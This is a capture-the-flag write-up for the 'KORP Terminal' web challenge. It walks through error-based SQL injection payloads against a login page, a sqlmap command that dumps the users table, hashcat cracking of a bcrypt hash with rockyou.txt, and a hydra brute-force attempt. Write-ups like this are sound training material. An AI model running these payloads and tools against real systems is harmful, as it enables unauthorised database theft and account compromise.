---
layout: Post
format: chall
title: KORP Terminal
date: 2024-03-09
ctf: Cyber Apocalypse
tags: [SQLi, SQLmap, Hashcat]
category: [Web]
---
# KORP Terminal

<a class="back-link" href="../../">< Go back</a>

KORP Terminal
Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.

<br><br>

The website was just a basic login page, though the auth didn't use http-forms but just a `Basic` auth. I tried running hydra with `http-get` but it didn't work, I don't really know why. So instead I just focused on the webpage itself.

After trying lots of different things I found that the service was vulnerable to SQLi's:

```sql
' AND extractvalue(rand(),concat(0x3a,(SELECT version()))) --+
```

Response: `1105 (HY000): XPATH syntax error: ':10.11.6-MariaDB'"`

Looking online we don't have any notable exploits for this version, but we can still try to extract some information.

```sql
' AND extractvalue(rand(),concat(0x3a,(SELECT column_name FROM table_name LIMIT 1))) --+
```

Response: `"1142 (42000): SELECT command denied to user 'lean'@'localhost' for table'korp_terminal'.'table_name'"`

We learned that the database schema name is `korp_terminal`. And that there is a `lean` user.

Let's try to view how the schema is made up:

```sql
' AND extractvalue(rand(),concat(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_schema = 'korp_terminal'))) --+
```

Response: `1242 (21000): Subquery returns more than 1 row`

Nice let's try to step into the schema cols:

```sql
' AND extractvalue(rand(),concat(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_schema = 'korp_terminal' LIMIT 0,1))) --+
```

Responses:

- for `LIMIT 0,1`: `1105 (HY000): XPATH syntax error: ':id'`
- for `LIMIT 1,1`: `1105 (HY000): XPATH syntax error: ':username'`
- for `LIMIT 2,2`: `1105 (HY000): XPATH syntax error: ':password'`

Because this is a "very easy" challenge, let's try to guess the table name as `users` and extract the username:

```sql
' AND extractvalue(rand(),concat(0x3a,(SELECT username FROM users LIMIT 0,1))) --
```

Response: `1105 (HY000): XPATH syntax error: ':admin'`

Perfect we have a `admin` user in the `users` table, our guess was correct, let's grab their password:

```sql
' AND extractvalue(rand(),concat(0x3a,(SELECT password FROM users WHERE username = 'admin' LIMIT 0,1))) --
```

We do get the password but it's partially cropped. After spending some time trying to manually investigate, I abandoned and just threw sqlmap at it, it worked pretty damn well:

```bash
sqlmap -u "http://<IP>/" -v 3 --forms --ignore-code=401 -D korp_terminal -T users --dump
# Database: korp_terminal
# Table: users
# [1 entry]
# +----+--------------------------------------------------------------+----------+
# | id | password                                                     | username |
# +----+--------------------------------------------------------------+----------+
# | 1  | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin    |
# +----+--------------------------------------------------------------+----------+
```

I always forget about sqlmap, what a crazy tool. Okay so bcrypt, 12 rounds, this seems weirdly complex for a "very easy" challenge, but ok, let's give it to hashcat with rockyou.txt:

```bash
hashcat -m 3200 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
# $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
```

I feel betrayed as I've left hydra running in the background over rockyou and it didn't manage to get in... I don't really understand what I did wrong with hydra:

```bash
hydra -I -l admin -P /usr/share/wordlists/rockyou.txt -s 44667 -V 94.237.50.175 http-post /
# I also tried http-get, nothing.
```

Connecting with `admin:password123` we get the flag.
